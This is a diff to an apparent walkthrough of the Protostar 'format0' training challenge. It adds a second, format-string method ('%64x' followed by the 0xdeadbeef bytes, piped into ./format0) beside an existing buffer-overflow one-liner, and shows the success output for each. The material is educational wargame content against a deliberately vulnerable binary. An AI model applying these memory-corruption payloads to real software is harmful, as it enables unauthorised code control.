@@ -34,3 +34,13 @@ Sample output:
 user@protostar:/opt/protostar/bin$ python -c "print 'a'*64+'\xef\xbe\xad\xde'" | xargs ./format0
 you have hit the target correctly :)
 ```
+
+Method 2 (preferred):
+
+Type the following: `python -c "print '%64x\xef\xbe\xad\xde'" | xargs ./format0`
+
+Sample output:
+```bash
+user@protostar:/opt/protostar/bin$ python -c "print '%64x\xef\xbe\xad\xde'" | xargs ./format0
+you have hit the target correctly :)
+```
